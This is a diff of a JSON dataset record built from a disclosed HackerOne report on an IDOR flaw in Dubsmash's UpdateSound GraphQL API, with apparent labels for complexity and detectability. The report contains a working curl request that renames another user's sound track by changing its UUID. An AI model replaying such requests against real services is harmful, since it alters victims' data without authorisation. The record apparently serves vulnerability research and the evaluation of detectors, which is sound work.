@@ -1,48 +1,48 @@
 {
-    "reported_to": "Reddit",
-    "reported_by": "sandeep_rj49 ",
-    "title": "[dubmash] Lack of authorization checks - Update Sound Titles",
-    "content": "\nSummary:\nDuring the security testing, it has been observed that the UpdateSound api is vulnerable to IDOR. It allows an attacker to edit the victim's sound track titles. This vulnerability can be exploited using the sound track's uuid in the vulnerable request. This id is publicly known.\nSteps To Reproduce:\nReplay the vulnerable request using a valid authorization token.\nChange the uuid parameter value with the victim's sound track UUID.\nVictim's sound track title will be changed.\nVulnerable request:\ncurl -i -s -k -X $'POST' \\\n-H $'Host: gateway-production.dubsmash.com' -H $'X-Dmac: ' -H $'X-Remote-Config-Values: []' -H $'X-Time: 1613158267' -H $'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H $'X-Accept-Content-Language: en_IN' -H $'X-Device-Timezone: 19800' -H $'X-Device-Language: en' -H $'X-Device-Country: IN' -H $'X-Build-Number: 45431' -H $'Content-Length: 676' -H $'X-App-Version: 5.20.0' -H $'X-Platform: ios' -H $'Connection: close' -H $'Authorization: Bearer XXXXXX' -H $'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H $'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-Dmac-Version: 2' -H $'If-None-Match: W/\\\"88-IVjhmW06Njcacim4nwHnJNviYsE\\\"' \\\n-b $'cfduid=' \\\n--data-binary $'{\\\"query\\\":\\\"mutation UpdateSound($input: UpdateSoundInput!) {\\n updateSound(input: $input) {\\n typename\\n sound {\\n typename\\n ...SoundFragment\\n }\\n }\\n}\\nfragment SoundFragment on Sound {\\n typename\\n uuid\\n created_at\\n sound\\n name\\n waveform_raw_data\\n liked\\n soundStatus: status\\n creator {\\n typename\\n ...ContentCreatorFragment\\n }\\n share_link\\n num_likes\\n num_videos\\n}\\nfragment ContentCreatorFragment on User {\\n typename\\n username\\n uuid\\n date_joined\\n followed\\n has_invite_badge\\n badges\\n profile_picture\\n}\\\",\\\"variables\\\":{\\\"input\\\":{\\\"uuid\\\":\\\"a687eb61ad814a09a8a85cedef7837f3\\\",\\\"name\\\":\\\"test12355556777\\\"}}}' \\\n$'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'\nImpact\nAn attacker can change the title of the victim's sound track to some malicious title like accounthack or similar.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "Reddit",
+  "reported_by": "sandeep_rj49 ",
+  "title": "[dubmash] Lack of authorization checks - Update Sound Titles",
+  "content": "\nSummary:\nDuring the security testing, it has been observed that the UpdateSound api is vulnerable to IDOR. It allows an attacker to edit the victim's sound track titles. This vulnerability can be exploited using the sound track's uuid in the vulnerable request. This id is publicly known.\nSteps To Reproduce:\nReplay the vulnerable request using a valid authorization token.\nChange the uuid parameter value with the victim's sound track UUID.\nVictim's sound track title will be changed.\nVulnerable request:\ncurl -i -s -k -X $'POST' \\\n-H $'Host: gateway-production.dubsmash.com' -H $'X-Dmac: ' -H $'X-Remote-Config-Values: []' -H $'X-Time: 1613158267' -H $'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H $'X-Accept-Content-Language: en_IN' -H $'X-Device-Timezone: 19800' -H $'X-Device-Language: en' -H $'X-Device-Country: IN' -H $'X-Build-Number: 45431' -H $'Content-Length: 676' -H $'X-App-Version: 5.20.0' -H $'X-Platform: ios' -H $'Connection: close' -H $'Authorization: Bearer XXXXXX' -H $'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H $'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-Dmac-Version: 2' -H $'If-None-Match: W/\\\"88-IVjhmW06Njcacim4nwHnJNviYsE\\\"' \\\n-b $'cfduid=' \\\n--data-binary $'{\\\"query\\\":\\\"mutation UpdateSound($input: UpdateSoundInput!) {\\n updateSound(input: $input) {\\n typename\\n sound {\\n typename\\n ...SoundFragment\\n }\\n }\\n}\\nfragment SoundFragment on Sound {\\n typename\\n uuid\\n created_at\\n sound\\n name\\n waveform_raw_data\\n liked\\n soundStatus: status\\n creator {\\n typename\\n ...ContentCreatorFragment\\n }\\n share_link\\n num_likes\\n num_videos\\n}\\nfragment ContentCreatorFragment on User {\\n typename\\n username\\n uuid\\n date_joined\\n followed\\n has_invite_badge\\n badges\\n profile_picture\\n}\\\",\\\"variables\\\":{\\\"input\\\":{\\\"uuid\\\":\\\"a687eb61ad814a09a8a85cedef7837f3\\\",\\\"name\\\":\\\"test12355556777\\\"}}}' \\\n$'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'\nImpact\nAn attacker can change the title of the victim's sound track to some malicious title like accounthack or similar.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Improper Authorization"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1634860140,
+  "report_url": "https://hackerone.com/reports/1102365",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Obtain a valid authorization token for the Dubsmash application."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Improper Authorization"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1634860140,
-    "report_url": "https://hackerone.com/reports/1102365",
-    "is_multi_component": false,
-    "complexity": "LOW",
-    "novelty": "MEDIUM",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "Obtain a valid authorization token for the Dubsmash application."
-        ],
-        [
-            2,
-            "Send a POST request to the UpdateSound API endpoint with the victim's sound track UUID and a modified title in the payload."
-        ]
-    ],
-    "vuln_description": "The UpdateSound API endpoint lacks proper authorization checks, allowing an attacker to modify the title of any sound track by simply changing the UUID in the request to that of the victim's sound track. This is an Insecure Direct Object Reference (IDOR) vulnerability.",
-    "reason": "The vulnerability is straightforward to exploit once the attacker has a valid authorization token and knows the victim's sound track UUID. The attack does not involve complex interactions or state manipulations, and the logic is common in applications with insufficient authorization checks.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": false,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": true,
-        "authnz_byppass_detectable": false
-    }
+    [
+      2,
+      "Send a POST request to the UpdateSound API endpoint with the victim's sound track UUID and a modified title in the payload."
+    ]
+  ],
+  "vuln_description": "The UpdateSound API endpoint lacks proper authorization checks, allowing an attacker to modify the title of any sound track by simply changing the UUID in the request to that of the victim's sound track. This is an Insecure Direct Object Reference (IDOR) vulnerability.",
+  "reason": "The vulnerability is straightforward to exploit once the attacker has a valid authorization token and knows the victim's sound track UUID. The attack does not involve complex interactions or state manipulations, and the logic is common in applications with insufficient authorization checks.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": false,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an authenticated user (user_session) performing an action (UpdateSound) on a resource (sound track) identified by a UUID (resource_id). The methodology would detect this by collecting the (user_session, action, resource_id) tuple and then testing with other user_sessions or resource_ids to see if the authorization boundary can be crossed, which matches the described vulnerability.",
+    "is_detectable": true
+  }
 }
